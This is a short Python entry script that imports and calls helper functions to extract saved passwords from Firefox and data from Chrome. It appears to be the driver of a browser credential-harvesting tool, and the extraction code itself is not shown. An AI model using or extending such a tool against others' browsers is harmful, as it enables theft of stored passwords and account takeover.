from chromium_utils import extract_data as chrome_data
from firefox_utils import extract_passwords as firefox_pass
import utils

if __name__ == "__main__":
    utils.set_platform()
    firefox_pass()
    chrome_data()